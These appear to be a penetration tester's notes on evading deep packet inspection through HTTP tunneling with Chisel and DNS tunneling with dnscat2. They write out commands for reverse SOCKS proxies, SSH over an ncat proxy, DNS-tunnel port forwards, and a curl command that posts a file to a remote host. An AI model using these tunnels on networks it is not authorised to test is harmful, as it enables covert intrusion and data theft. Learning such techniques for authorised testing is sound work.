* Deep packet inspection (DPI): DPI is a solution usually combined with a firewall to monitor traffic and can be configured to allow only packets that contain specific protocols in its headers and reject everything else. 
* HTTP Tunneling:
	* If the DPI allows only HTTP traffic, then using [[SSH tunneling]] might be an issue. In this case try HTTP tunneling.
	* Chisel uses HTTP tunneling.
	* Example chisel client command for reverse proxy: `chisel client <connect address>:<connect port> R:socks`
	* Example chisel server command for reverse proxy: `chisel server --port <connect port> --reverse`
	* `tcpdump` for checking if any connections are received on the server side.
	* Send output using `curl` from the client side to server side to troubleshoot errors. Redirect error to a file and use `curl --data @<file> http://<ip>:<port>/`.
	* Using SSH to connect to a host on the other side of the HTTP tunnel: `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy <proxy_ip>:<port> %h %p' <user>@<host>`
* DNS Tunneling:
	* If the DPI allows only DNS traffic, then using [[SSH tunneling]] might be an issue. In this case try DNS tunneling.
	* For machine that is configured to be the authoritative name server for domain `<domain>` on the network, run dnscat server with: `dnscat2-server <domain>`
	* On the machine you need to make connection with for port forward for dnscat server: `dnscat <domain>
	* Once a connection is established use the below commands to interact:
		* `windows`: shows available sessions.
		* `window -i <session no>`: opens an interactive session given `<session no>`.
		* `?`: shows lists of commands in the interactive sessions.
		* `listen <listen_ip>:<listen_port> <connect_ip>:<connect_port>`: uses the DNS tunnel to open a port forward from `<listen_ip>:<listen_port>` to `<connect_ip>:<connect_port>`
